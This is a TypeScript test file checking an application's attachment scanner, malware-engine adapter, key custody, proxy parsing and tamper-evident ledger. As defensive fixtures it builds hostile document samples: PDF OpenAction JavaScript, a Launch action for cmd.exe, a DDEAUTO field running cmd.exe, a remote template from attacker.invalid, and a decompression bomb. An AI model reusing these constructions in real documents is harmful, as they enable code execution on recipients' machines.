import test from "node:test";
import assert from "node:assert/strict";
import { createHash, randomBytes } from "node:crypto";
import { deflateSync } from "node:zlib";
import { mkdtemp, readFile, writeFile, access } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createServer } from "node:net";
import JSZip from "jszip";
import { S3Client } from "@aws-sdk/client-s3";
import { verifyAttachment, inspectPdf } from "../src/attachment-scan";
import {
  clamdEngine,
  developmentHeuristicEngine,
  engineFromEnvironment,
  parseClamdAddress,
  parseInstreamReply,
} from "../src/malware-engine";
import {
  REHEARSAL_ACKNOWLEDGEMENT,
  custodyProvider,
  custodyProviderName,
  generateCustodianKeypair,
  setCustodianSecret,
} from "../src/key-custody";
import { clientBucket, trustedProxy } from "../src/rate-limit";
import { RuntimeGuardError } from "../src/runtime-guard";
import { localFileSink, s3Sink, tombstoneSinkFromEnvironment, type Tombstone } from "../src/tombstone-ledger";
import { checkEnvironment, loadManifest } from "../src/preflight";
import { EICAR, startClamdDouble } from "./adapters/clamd-double";
import { startS3Double } from "./adapters/s3-double";

// ---------------------------------------------------------------------------
// Post-Audit Repair Pass 4 — production-security adapters, without a database.
//
// Labels used in test names:
//   [policy]        pure type/active-document checks on synthetic bytes;
//   [mocked-engine] the clamd adapter against tests/adapters/clamd-double.ts, a
//                   protocol double that is NOT an antivirus engine;
//   [real-engine]   a running clamd named by ORGFIT_TEST_CLAMD_ADDRESS — skipped,
//                   and reported as not run, when that is absent;
//   [mocked-storage] the S3 ledger sink against tests/adapters/s3-double.ts,
//                   which records Object Lock headers but enforces nothing.
// No live malware is used: the only "threat" is the harmless EICAR test string.
// ---------------------------------------------------------------------------

const code = (fn: () => unknown) => {
  try {
    fn();
    return "NO_ERROR";
  } catch (e) {
    return e instanceof RuntimeGuardError ? e.code : (e as Error).message;
  }
};
const pdf = (body: string) => Buffer.from(`%PDF-1.7\n${body}\ntrailer<</Root 1 0 R>>\n%%EOF\n`, "latin1");
const verdict = async (bytes: Buffer, filename = "file.pdf", declaredType = "application/pdf") =>
  verifyAttachment({ bytes, filename, declaredType });
const WORD = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
const EXCEL = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
async function ooxml(kind: "word" | "xl", parts: Record<string, string | Buffer> = {}) {
  const zip = new JSZip();
  zip.file("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>');
  zip.file("_rels/.rels", '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>');
  zip.file(kind === "word" ? "word/document.xml" : "xl/workbook.xml", "<doc/>");
  for (const [name, content] of Object.entries(parts)) zip.file(name, content);
  return Buffer.from(await zip.generateAsync({ type: "nodebuffer", compression: "DEFLATE" }));
}

test("[policy] AP-1 PDF active-document policy: the audit probe and its evasions are refused, ordinary PDFs pass", async () => {
  // The 14 September audit's probe: a PDF-prefixed buffer with an OpenAction
  // JavaScript dictionary was CLEAN. It is now refused.
  assert.deepEqual(await verdict(pdf("1 0 obj<</Type/Catalog/OpenAction<</S/JavaScript/JS(app.alert(1))>>>>endobj")), {
    verdict: "REJECTED",
    code: "DOCUMENT_ACTIVE_CONTENT",
  });
  const refused: [string, Buffer, string][] = [
    ["hex-escaped name", pdf("1 0 obj<</Type/Catalog/OpenAction<</S/J#61vaScript>>>>endobj"), "DOCUMENT_ACTIVE_CONTENT"],
    ["launch action", pdf("1 0 obj<</Type/Action/S/Launch/F(cmd.exe)>>endobj"), "DOCUMENT_ACTIVE_CONTENT"],
    ["embedded file", pdf("1 0 obj<</Type/Catalog/Names<</EmbeddedFiles 2 0 R>>>>endobj"), "DOCUMENT_ACTIVE_CONTENT"],
    ["additional actions", pdf("1 0 obj<</Type/Page/AA<</O 3 0 R>>>>endobj"), "DOCUMENT_ACTIVE_CONTENT"],
    ["XFA form", pdf("1 0 obj<</AcroForm<</XFA 4 0 R>>>>endobj"), "DOCUMENT_ACTIVE_CONTENT"],
    ["encrypted", pdf("1 0 obj<</Type/Catalog>>endobj\n2 0 obj<</Filter/Standard>>endobj trailer<</Encrypt 2 0 R>>"), "DOCUMENT_UNVERIFIABLE"],
    ["no end-of-file marker", Buffer.from("%PDF-1.7\n1 0 obj<</Type/Catalog>>endobj\n", "latin1"), "DOCUMENT_UNVERIFIABLE"],
  ];
  for (const [label, bytes, expected] of refused)
    assert.deepEqual(await verdict(bytes), { verdict: "REJECTED", code: expected }, label);

  // JavaScript hidden in a Flate-compressed object stream is found.
  const hidden = deflateSync(Buffer.from("5 0 <</S/JavaScript/JS(app.alert(1))>>", "latin1"));
  const objStm = Buffer.concat([
    Buffer.from(`%PDF-1.7\n9 0 obj<</Type/ObjStm/N 1/First 4/Length ${hidden.length}/Filter/FlateDecode>>stream\n`, "latin1"),
    hidden,
    Buffer.from("\nendstream\nendobj\ntrailer<</Root 1 0 R>>\n%%EOF\n", "latin1"),
  ]);
  assert.deepEqual(await verdict(objStm), { verdict: "REJECTED", code: "DOCUMENT_ACTIVE_CONTENT" });
  // An object stream behind a filter this check does not decode is unverifiable, not passed.
  const lzw = Buffer.from("%PDF-1.7\n9 0 obj<</Type/ObjStm/N 1/Filter/LZWDecode/Length 4>>stream\nabcd\nendstream\nendobj\n%%EOF\n", "latin1");
  assert.deepEqual(await verdict(lzw), { verdict: "REJECTED", code: "DOCUMENT_UNVERIFIABLE" });
  // A corrupt Flate object stream is unverifiable.
  const corrupt = Buffer.from("%PDF-1.7\n9 0 obj<</Type/ObjStm/N 1/Filter/FlateDecode/Length 8>>stream\nnot-zlib\nendstream\nendobj\n%%EOF\n", "latin1");
  assert.deepEqual(await verdict(corrupt), { verdict: "REJECTED", code: "DOCUMENT_UNVERIFIABLE" });

  // Permitted: a hyperlink, an ordinary open action, and binary image data that
  // happens to spell "/JS " inside a stream body (stream bodies are not names).
  assert.equal((await verdict(pdf("1 0 obj<</Type/Annot/Subtype/Link/A<</S/URI/URI(https://example.invalid)>>>>endobj"))).verdict, "CLEAN");
  assert.equal((await verdict(pdf("1 0 obj<</Type/Catalog/OpenAction[3 0 R/Fit]>>endobj"))).verdict, "CLEAN");
  const image = Buffer.concat([
    Buffer.from("%PDF-1.7\n7 0 obj<</Type/XObject/Subtype/Image/Filter/DCTDecode/Length 12>>stream\n", "latin1"),
    Buffer.from([0xff, 0xd8, 0x2f, 0x4a, 0x53, 0x20, 0x2f, 0x41, 0x41, 0x20, 0xff, 0xd9]),
    Buffer.from("\nendstream\nendobj\ntrailer<</Root 1 0 R>>\n%%EOF\n", "latin1"),
  ]);
  assert.equal(inspectPdf(image), null, "image bytes are not treated as dictionary names");
  // A large Flate object stream beyond the inspection bound is refused.
  const bomb = deflateSync(Buffer.alloc(70 * 1024 * 1024, 0x20));
  const bombPdf = Buffer.concat([
    Buffer.from(`%PDF-1.7\n9 0 obj<</Type/ObjStm/N 1/Filter/FlateDecode/Length ${bomb.length}>>stream\n`, "latin1"),
    bomb,
    Buffer.from("\nendstream\nendobj\n%%EOF\n", "latin1"),
  ]);
  assert.deepEqual(inspectPdf(bombPdf), { verdict: "REJECTED", code: "DOCUMENT_UNVERIFIABLE" });
});

test("[policy] AP-2 OOXML active-document policy: ActiveX, OLE, external templates, DDE and external workbook links are refused", async () => {
  const plain = await ooxml("word");
  assert.deepEqual(await verdict(plain, "notes.docx", WORD), { verdict: "CLEAN", contentType: WORD });
  const hyperlink = await ooxml("word", {
    "word/_rels/document.xml.rels":
      '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.invalid" TargetMode="External"/></Relationships>',
  });
  assert.equal((await verdict(hyperlink, "notes.docx", WORD)).verdict, "CLEAN", "an external hyperlink is permitted");
  const refused: [string, Buffer, string, string][] = [
    ["ActiveX control", await ooxml("word", { "word/activeX/activeX1.xml": "<ax/>" }), "notes.docx", WORD],
    ["embedded OLE package", await ooxml("word", { "word/embeddings/Microsoft_Excel_Worksheet.xlsx": "PK" }), "notes.docx", WORD],
    [
      "remote template",
      await ooxml("word", {
        "word/_rels/settings.xml.rels":
          '<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://attacker.invalid/t.dotm" TargetMode="External"/></Relationships>',
      }),
      "notes.docx",
      WORD,
    ],
    [
      "DDE field",
      await ooxml("word", {
        "word/document.xml": '<w:document><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" </w:instrText></w:r></w:document>',
      }),
      "notes.docx",
      WORD,
    ],
    ["external workbook link", await ooxml("xl", { "xl/externalLinks/externalLink1.xml": "<externalLink/>" }), "data.xlsx", EXCEL],
  ];
  for (const [label, bytes, filename, type] of refused)
    assert.deepEqual(await verdict(bytes, filename, type), { verdict: "REJECTED", code: "DOCUMENT_ACTIVE_CONTENT" }, label);
  // The existing macro and nested-archive refusals are unchanged.
  assert.deepEqual(await verdict(await ooxml("word", { "word/vbaProject.bin": "x" }), "m.docx", WORD), { verdict: "REJECTED", code: "MACRO_CONTENT" });
  // A container that declares more than the inspection bound is refused before expansion.
  const big = await ooxml("word", { "word/media/big.bin.txt": Buffer.alloc(70 * 1024 * 1024, 0x41) });
  assert.deepEqual(await verdict(big, "big.docx", WORD), { verdict: "REJECTED", code: "DOCUMENT_UNVERIFIABLE" });
});

test("[policy] AP-3 type verification and malware scanning are separate controls", async () => {
  // Type verification no longer looks for malware markers at all: EICAR bytes
  // named as a PDF are refused for what they are (not a PDF), and the decision
  // about malware belongs to an engine.
  const eicar = Buffer.from(EICAR, "latin1");
  assert.deepEqual(await verdict(eicar), { verdict: "REJECTED", code: "TYPE_NOT_ALLOWED" });
  const heuristic = developmentHeuristicEngine();
  assert.equal(heuristic.assurance, "development-heuristic");
  assert.equal((await heuristic.scan(eicar)).outcome, "THREAT_FOUND");
  // The heuristic knows one string. A file it passes is not malware-scanned,
  // which is exactly why its name is recorded with every verdict.
  assert.equal((await heuristic.scan(pdf("1 0 obj<</Type/Catalog>>endobj"))).outcome, "NO_THREAT_FOUND");
});

test("[policy] AP-4 engine configuration: production never falls back to the development heuristic", () => {
  assert.equal(code(() => engineFromEnvironment({ NODE_ENV: "production" })), "SCAN_ENGINE_REQUIRED");
  assert.equal(code(() => engineFromEnvironment({ NODE_ENV: "production", ATTACHMENT_SCAN_ENGINE: "development-heuristic" })), "SCAN_ENGINE_DEVELOPMENT_IN_PRODUCTION");
  assert.equal(code(() => engineFromEnvironment({ NODE_ENV: "production", ATTACHMENT_SCAN_ENGINE: "magic-av" })), "SCAN_ENGINE_UNSUPPORTED");
  assert.equal(code(() => engineFromEnvironment({ NODE_ENV: "production", ATTACHMENT_SCAN_ENGINE: "clamd" })), "SCAN_ENGINE_ADDRESS_MISSING");
  assert.equal(code(() => engineFromEnvironment({ NODE_ENV: "production", ATTACHMENT_SCAN_ENGINE: "clamd", ATTACHMENT_SCAN_CLAMD_ADDRESS: "tcp://av.internal:3310" })), "SCAN_ENGINE_ADDRESS_NOT_LOCAL");
  assert.equal(code(() => engineFromEnvironment({ NODE_ENV: "production", ATTACHMENT_SCAN_ENGINE: "clamd", ATTACHMENT_SCAN_CLAMD_ADDRESS: "http://127.0.0.1:3310" })), "SCAN_ENGINE_ADDRESS_INVALID");
  assert.equal(code(() => engineFromEnvironment({ NODE_ENV: "production", ATTACHMENT_SCAN_ENGINE: "clamd", ATTACHMENT_SCAN_CLAMD_ADDRESS: "tcp://127.0.0.1:3310", ATTACHMENT_SCAN_TIMEOUT_SECONDS: "0" })), "SCAN_ENGINE_TIMEOUT_INVALID");
  assert.equal(engineFromEnvironment({ NODE_ENV: "production", ATTACHMENT_SCAN_ENGINE: "clamd", ATTACHMENT_SCAN_CLAMD_ADDRESS: "unix:/run/clamav/clamd.sock" }).assurance, "maintained-engine");
  assert.equal(engineFromEnvironment({ NODE_ENV: "production", ATTACHMENT_SCAN_ENGINE: "clamd", ATTACHMENT_SCAN_CLAMD_ADDRESS: "tcp://127.0.0.1:3310" }).name, "clamd");
  assert.equal(engineFromEnvironment({ NODE_ENV: "development" }).name, "development-heuristic");
  assert.deepEqual(parseClamdAddress("tcp://[::1]:3310"), { kind: "tcp", host: "::1", port: 3310 });
  assert.equal(parseInstreamReply("stream: OK"), "NO_THREAT_FOUND");
  assert.equal(parseInstreamReply("stream: Win.Test.EICAR_HDB-1 FOUND"), "THREAT_FOUND");
  assert.equal(parseInstreamReply("INSTREAM size limit exceeded. ERROR"), "INDETERMINATE");
  assert.equal(parseInstreamReply("stream: OK FOUND ERROR"), "INDETERMINATE");
  // Preflight fails the scanner in production for the same reasons, and warns in development.
  const manifest = loadManifest();
  const scanner = { NODE_ENV: "production", SCANNER_DATABASE_URL: "postgresql://orgfit_scanner:x@db.internal:5432/orgfit?sslmode=verify-full", ATTACHMENT_ENCRYPTION_KEY: "e".repeat(64), ATTACHMENT_S3_BUCKET: "b" };
  const fail = (env: Record<string, string>) => checkEnvironment("scanner", env, { production: true, manifest }).find((f) => f.check === "scan-engine");
  assert.equal(fail(scanner)?.outcome, "FAIL");
  assert.equal(fail({ ...scanner, ATTACHMENT_SCAN_ENGINE: "development-heuristic" })?.outcome, "FAIL");
  assert.equal(fail({ ...scanner, ATTACHMENT_SCAN_ENGINE: "clamd", ATTACHMENT_SCAN_CLAMD_ADDRESS: "unix:/run/clamav/clamd.sock" })?.outcome, "PASS");
  assert.equal(
    checkEnvironment("scanner", { ...scanner, NODE_ENV: "development" }, { production: false, manifest }).find((f) => f.check === "scan-engine")?.outcome,
    "WARN",
  );
});

test("[mocked-engine] AP-5 clamd adapter against the protocol double: verdicts, reassembly, errors, timeout and outage", async () => {
  const double = await startClamdDouble();
  try {
    const engine = clamdEngine(parseClamdAddress(double.address), 1500);
    const probe = await engine.probe();
    assert.deepEqual(probe, { available: true, version: "ClamAV 1.4.1/27400/Tue Sep 15 08:00:00 2026" });
    // Clean bytes, larger than several 64 KiB chunks, arrive byte-identical.
    const clean = randomBytes(300 * 1024);
    const ok = await engine.scan(clean);
    assert.deepEqual(ok, { outcome: "NO_THREAT_FOUND", engine: "clamd", engineVersion: probe.available ? probe.version : null });
    assert.equal(createHash("sha256").update(double.received.at(-1)!).digest("hex"), createHash("sha256").update(clean).digest("hex"));
    // The harmless standard test string is reported as a threat.
    assert.equal((await engine.scan(Buffer.from(EICAR, "latin1"))).outcome, "THREAT_FOUND");
    // An engine error line, an unexpected reply and a dropped connection are
    // not verdicts.
    double.setMode("size-limit");
    assert.deepEqual(await engine.scan(clean), { outcome: "INDETERMINATE", engine: "clamd", code: "SCAN_ENGINE_NO_VERDICT" });
    double.setMode("garbage");
    assert.equal((await engine.scan(clean)).outcome, "INDETERMINATE");
    double.setMode("close-mid-stream");
    assert.equal((await engine.scan(clean)).outcome, "INDETERMINATE");
    // An engine that accepts the file and never answers times out within the deadline.
    double.setMode("hang");
    const started = Date.now();
    assert.deepEqual(await engine.scan(clean), { outcome: "TIMEOUT", engine: "clamd", code: "SCAN_ENGINE_TIMEOUT" });
    assert.ok(Date.now() - started < 4000, "deadline honoured");
  } finally {
    await double.close();
  }
  // Nothing listening: the probe and a scan both report an outage, never a verdict.
  const vacant = createServer();
  await new Promise<void>((r) => vacant.listen(0, "127.0.0.1", r));
  const port = (vacant.address() as { port: number }).port;
  await new Promise<void>((r) => vacant.close(() => r()));
  const down = clamdEngine({ kind: "tcp", host: "127.0.0.1", port }, 1500);
  assert.deepEqual(await down.probe(), { available: false, code: "SCAN_ENGINE_UNREACHABLE" });
  assert.deepEqual(await down.scan(Buffer.from("x")), { outcome: "UNAVAILABLE", engine: "clamd", code: "SCAN_ENGINE_UNREACHABLE" });
});

test("[real-engine] AP-6 a running clamd detects the EICAR test string and passes a clean file", async (t) => {
  const address = process.env.ORGFIT_TEST_CLAMD_ADDRESS;
  if (!address) {
    t.skip("NOT RUN: ORGFIT_TEST_CLAMD_ADDRESS is not set; no maintained engine was available to this run");
    return;
  }
  const engine = clamdEngine(parseClamdAddress(address), 30_000);
  const probe = await engine.probe();
  assert.equal(probe.available, true, "the configured clamd must answer VERSION");
  assert.equal((await engine.scan(Buffer.from(EICAR, "latin1"))).outcome, "THREAT_FOUND");
  assert.equal((await engine.scan(pdf("1 0 obj<</Type/Catalog>>endobj"))).outcome, "NO_THREAT_FOUND");
});

test("[policy] AP-7 key custody: an explicit provider, refused in production, destruction evidence never claims crypto-erasure", async () => {
  assert.equal(custodyProviderName({ NODE_ENV: "development" }), "development-file");
  assert.equal(code(() => custodyProviderName({ NODE_ENV: "production" })), "KEY_CUSTODY_PROVIDER_REQUIRED");
  assert.equal(code(() => custodyProviderName({ NODE_ENV: "production", CAMPAIGN_KEY_CUSTODY_PROVIDER: "development-file" })), "KEY_CUSTODY_DEVELOPMENT_IN_PRODUCTION");
  // No "managed" provider is implemented, so naming one is refused rather than
  // silently served by the file adapter.
  for (const name of ["aws-kms", "managed", "vault", "hsm"])
    assert.equal(code(() => custodyProviderName({ NODE_ENV: "production", CAMPAIGN_KEY_CUSTODY_PROVIDER: name })), "KEY_CUSTODY_PROVIDER_UNSUPPORTED", name);
  assert.equal(
    custodyProviderName({ NODE_ENV: "production", CAMPAIGN_KEY_CUSTODY_PROVIDER: "development-file", CAMPAIGN_KEY_CUSTODY_REHEARSAL_ONLY: REHEARSAL_ACKNOWLEDGEMENT }),
    "development-file",
    "only a local rehearsal may acknowledge the stand-in",
  );
  // …and preflight fails that acknowledgement in any production file.
  const manifest = loadManifest();
  for (const processName of ["staff", "processor"]) {
    const env = {
      NODE_ENV: "production",
      CAMPAIGN_KEY_CUSTODY_PROVIDER: "development-file",
      CAMPAIGN_KEY_CUSTODY_REHEARSAL_ONLY: REHEARSAL_ACKNOWLEDGEMENT,
    };
    const findings = checkEnvironment(processName, env, { production: true, manifest });
    assert.equal(findings.find((f) => f.check === "key-custody")?.outcome, "FAIL", processName);
    assert.equal(findings.find((f) => f.check === "key-custody-rehearsal")?.outcome, "FAIL", processName);
  }

  // The development provider's destruction evidence is literal about its limits.
  const dir = await mkdtemp(join(tmpdir(), "orgfit-custody-ap7-"));
  const pair = await generateCustodianKeypair();
  const saved = { ...process.env };
  Object.assign(process.env, { NODE_ENV: "test", CAMPAIGN_KEY_CUSTODY_DIRECTORY: dir, CAMPAIGN_KEY_CUSTODY_PUBLIC_KEY: pair.publicKey });
  setCustodianSecret(pair.secretKey);
  try {
    const provider = custodyProvider();
    assert.equal(provider.managed, false);
    const key = await provider.createCampaignKey();
    const copy = await readFile(join(dir, `${key.keyReference}.sealed`)); // what a backup would hold
    const first = await provider.destroyCampaignKey(key.keyReference);
    assert.equal(first.outcome, "LOCAL_COPY_REMOVED");
    assert.equal(first.cryptoErasure, false);
    assert.equal(first.backupCopiesMayExist, true);
    assert.match(first.summary, /not crypto-erasure/);
    await assert.rejects(access(join(dir, `${key.keyReference}.sealed`)));
    assert.equal((await provider.destroyCampaignKey(key.keyReference)).outcome, "ALREADY_ABSENT");
    // The reason it is not erasure, demonstrated: a copy taken before
    // destruction plus the custodian secret still opens the key.
    await writeFile(join(dir, `${key.keyReference}.sealed`), copy);
    const reopened = await provider.openCampaignKey(key.keyReference);
    assert.deepEqual(Buffer.from(reopened.publicKey), key.publicKey);
    reopened.privateKey.fill(0);
  } finally {
    setCustodianSecret(undefined);
    process.env = saved;
  }
});

test("[policy] AP-8 trusted proxy: explicit in production, strict parsing, forged or non-address values ignored", () => {
  const h = (value: string) => new Headers({ "x-forwarded-for": value });
  assert.equal(code(() => trustedProxy({ NODE_ENV: "production" })), "TEMPORARILY_UNAVAILABLE");
  assert.equal(trustedProxy({ NODE_ENV: "production", RATE_LIMIT_CLIENT_IP_HEADER: "none" }), null);
  assert.equal(trustedProxy({ NODE_ENV: "development" }), null);
  assert.equal(code(() => trustedProxy({ RATE_LIMIT_CLIENT_IP_HEADER: "x-forwarded-for", RATE_LIMIT_TRUSTED_PROXY_HOPS: "abc" })), "TEMPORARILY_UNAVAILABLE");
  assert.equal(code(() => trustedProxy({ RATE_LIMIT_CLIENT_IP_HEADER: "x forwarded" })), "TEMPORARILY_UNAVAILABLE");
  assert.equal(code(() => trustedProxy({ RATE_LIMIT_CLIENT_IP_HEADER: "x-forwarded-for", RATE_LIMIT_TRUSTED_PROXY_HOPS: "11" })), "TEMPORARILY_UNAVAILABLE");
  const env = { RATE_LIMIT_CLIENT_IP_HEADER: "x-forwarded-for", RATE_LIMIT_TRUSTED_PROXY_HOPS: "1" };
  // The proxy appends; the rightmost entry is the proxy's own hop, the one before is the client.
  assert.equal(clientBucket(h("6.6.6.6, 203.0.113.7, 10.0.0.2"), env), "203.0.113.7");
  assert.equal(clientBucket(h("203.0.113.7:51234, 10.0.0.2"), env), "203.0.113.7");
  assert.equal(clientBucket(h("[2001:db8:1:2::9]:443, 10.0.0.2"), env), "2001:db8:1:2::/64");
  assert.equal(clientBucket(h("not-an-address, 10.0.0.2"), env), null, "a non-address is ignored, not used as a bucket");
  assert.equal(clientBucket(h("203.0.113.7"), { RATE_LIMIT_CLIENT_IP_HEADER: "none" }), null);
  // Preflight: production staff and respondent must decide.
  const manifest = loadManifest();
  for (const name of ["staff", "respondent"]) {
    const trusted = (e: Record<string, string>) => checkEnvironment(name, { NODE_ENV: "production", ...e }, { production: true, manifest }).find((f) => f.check === "trusted-proxy")?.outcome;
    assert.equal(trusted({}), "FAIL", name);
    assert.equal(trusted({ RATE_LIMIT_CLIENT_IP_HEADER: "none" }), "WARN", name);
    assert.equal(trusted({ RATE_LIMIT_CLIENT_IP_HEADER: "x-forwarded-for" }), "PASS", name);
    assert.equal(trusted({ RATE_LIMIT_CLIENT_IP_HEADER: "x-forwarded-for", RATE_LIMIT_TRUSTED_PROXY_HOPS: "many" }), "FAIL", name);
  }
});

const stones = (from: number, n: number): Tombstone[] =>
  Array.from({ length: n }, (_, i) => ({
    seq: from + i,
    class: "ATTACHMENT",
    organizationId: "00000000-0000-4000-8000-0000000000aa",
    subjectId: `00000000-0000-4000-8000-${String(from + i).padStart(12, "0")}`,
    recordedAt: new Date(0).toISOString(),
  }));

test("[policy] AP-9 local ledger seals: a changed, removed or reordered line is detected; an interrupted shipment is repaired", async () => {
  const dir = await mkdtemp(join(tmpdir(), "orgfit-ledger-ap9-"));
  const sink = localFileSink(dir);
  let read = await sink.read();
  let head = await sink.repair(read);
  const s1 = await sink.append(stones(1, 3), head);
  const { sealHash } = await import("../src/tombstone-ledger");
  await sink.append(stones(4, 2), sealHash(s1));
  read = await sink.read();
  assert.equal(read.tombstones.length, 5);
  assert.equal(read.sealedThrough, 5);
  assert.equal(read.unsealed, 0);
  const lines = join(dir, "tombstones.jsonl");
  const original = await readFile(lines, "utf8");
  // Every line still has exactly the five fields and names no person.
  for (const line of original.trim().split("\n")) assert.deepEqual(Object.keys(JSON.parse(line)).sort(), ["class", "organizationId", "recordedAt", "seq", "subjectId"]);
  for (const tampered of [
    original.replace('"seq":2', '"seq":9'),
    original.split("\n").filter((_, i) => i !== 1).join("\n"),
    [original.split("\n")[1], original.split("\n")[0], ...original.split("\n").slice(2)].join("\n"),
  ]) {
    await writeFile(lines, tampered);
    await assert.rejects(sink.read(), /TOMBSTONE_LEDGER_INTEGRITY_FAILED/);
  }
  await writeFile(lines, original);
  // A shipment that wrote lines but crashed before its seal.
  await writeFile(lines, original + stones(6, 2).map((t) => JSON.stringify(t)).join("\n") + "\n");
  read = await sink.read();
  assert.equal(read.unsealed, 2);
  head = await sink.repair(read);
  read = await sink.read();
  assert.equal(read.unsealed, 0);
  assert.equal(read.sealedThrough, 7);
  assert.equal(read.lastSealHash, head);
  // A legacy ledger with no seals at all is read, reported unsealed, and sealed.
  const legacy = await mkdtemp(join(tmpdir(), "orgfit-ledger-legacy-"));
  await writeFile(join(legacy, "tombstones.jsonl"), stones(1, 4).map((t) => JSON.stringify(t)).join("\n") + "\n");
  const legacySink = localFileSink(legacy);
  assert.equal((await legacySink.read()).unsealed, 4);
  await legacySink.repair(await legacySink.read());
  assert.equal((await legacySink.read()).sealedThrough, 4);
  // Production refuses a local directory ledger and a bucket without Object Lock.
  assert.equal(code(() => tombstoneSinkFromEnvironment({ NODE_ENV: "production", TOMBSTONE_LEDGER_DIRECTORY: dir })), "TOMBSTONE_LEDGER_LOCAL_IN_PRODUCTION");
  assert.equal(code(() => tombstoneSinkFromEnvironment({ NODE_ENV: "production", TOMBSTONE_LEDGER_S3_BUCKET: "b" })), "TOMBSTONE_LEDGER_OBJECT_LOCK_REQUIRED");
  assert.equal(code(() => tombstoneSinkFromEnvironment({ NODE_ENV: "production", TOMBSTONE_LEDGER_S3_BUCKET: "b", TOMBSTONE_LEDGER_OBJECT_LOCK_DAYS: "30" })), "TOMBSTONE_LEDGER_OBJECT_LOCK_REQUIRED");
  assert.equal(tombstoneSinkFromEnvironment({ NODE_ENV: "production", TOMBSTONE_LEDGER_S3_BUCKET: "b", TOMBSTONE_LEDGER_OBJECT_LOCK_DAYS: "36" }).kind, "s3");
  assert.equal(code(() => tombstoneSinkFromEnvironment({ NODE_ENV: "development" })), "TOMBSTONE_LEDGER_REQUIRED");
});

test("[mocked-storage] AP-10 S3 ledger sink: conditional creates, checksums, Object Lock headers, retry-safe, tamper and outage detected", async () => {
  const double = await startS3Double();
  const saved = { ...process.env };
  Object.assign(process.env, { AWS_ACCESS_KEY_ID: "synthetic", AWS_SECRET_ACCESS_KEY: "synthetic-secret" });
  try {
    const client = new S3Client({ region: "us-east-1", endpoint: double.endpoint, forcePathStyle: true, maxAttempts: 2 });
    const sink = s3Sink({ bucket: "ledger", prefix: "tombstones/", objectLockDays: 36, client });
    const { sealHash } = await import("../src/tombstone-ledger");
    const s1 = await sink.append(stones(1, 3), null);
    await sink.append(stones(4, 2), sealHash(s1));
    const read = await sink.read();
    assert.equal(read.tombstones.length, 5);
    assert.equal(read.sealedThrough, 5);
    assert.equal(await sink.cursor(read), 5);
    const keys = [...double.objects.keys()].sort();
    assert.deepEqual(keys, [
      "ledger/tombstones/batches/00000000000000000001-00000000000000000003.jsonl",
      "ledger/tombstones/batches/00000000000000000004-00000000000000000005.jsonl",
      "ledger/tombstones/seals/00000000000000000001-00000000000000000003.json",
      "ledger/tombstones/seals/00000000000000000004-00000000000000000005.json",
    ]);
    for (const key of keys) {
      const { headers } = double.objects.get(key)!;
      assert.equal(headers["if-none-match"], "*", `${key} conditional create`);
      assert.ok(headers["x-amz-checksum-sha256"], `${key} checksum`);
      assert.equal(headers["x-amz-object-lock-mode"], "COMPLIANCE", `${key} lock mode`);
      const until = Date.parse(headers["x-amz-object-lock-retain-until-date"]);
      assert.ok(until - Date.now() > 35.9 * 86400_000, `${key} retained at least 36 days`);
    }
    // A shipment interrupted after its batch but before its seal: the batch is
    // read as unsealed, the cursor stays at the sealed end, and shipping the
    // identical batch again is accepted without overwriting it.
    const sealKey = keys[3];
    const savedSeal = double.objects.get(sealKey)!;
    const batchBefore = double.objects.get(keys[1])!.body;
    double.objects.delete(sealKey);
    const interrupted = await sink.read();
    assert.equal(interrupted.unsealed, 2);
    assert.equal(await sink.cursor(interrupted), 3);
    await sink.append(stones(4, 2), sealHash(s1));
    assert.deepEqual(double.objects.get(keys[1])!.body, batchBefore, "batch not overwritten");
    assert.equal((await sink.read()).sealedThrough, 5);
    void savedSeal;
    // A different body under an existing name is an integrity failure, not an overwrite.
    const conflicting = stones(4, 2);
    conflicting[0].subjectId = "00000000-0000-4000-8000-ffffffffffff";
    await assert.rejects(sink.append(conflicting, sealHash(s1)), /TOMBSTONE_LEDGER_INTEGRITY_FAILED/);
    // Tampering with a stored batch, or removing one, is detected on read.
    const batchKey = keys[0];
    const saved1 = double.objects.get(batchKey)!;
    double.objects.set(batchKey, { ...saved1, body: Buffer.from(saved1.body.toString().replace('"seq":2', '"seq":7')) });
    await assert.rejects(sink.read(), /TOMBSTONE_LEDGER_INTEGRITY_FAILED/);
    double.objects.delete(batchKey);
    await assert.rejects(sink.read(), /TOMBSTONE_LEDGER_INTEGRITY_FAILED/);
    double.objects.set(batchKey, saved1);
    assert.equal((await sink.read()).tombstones.length, 5);
    // An outage longer than the client's retries fails the shipment loudly.
    double.failNext(10);
    await assert.rejects(sink.append(stones(6, 1), null));
    double.failNext(0);
    // A transient failure within the retry budget succeeds.
    double.failNext(1);
    const s3 = await sink.append(stones(6, 1), (await sink.read()).lastSealHash);
    assert.equal(s3.to, 6);
  } finally {
    process.env = saved;
    await double.close();
  }
});
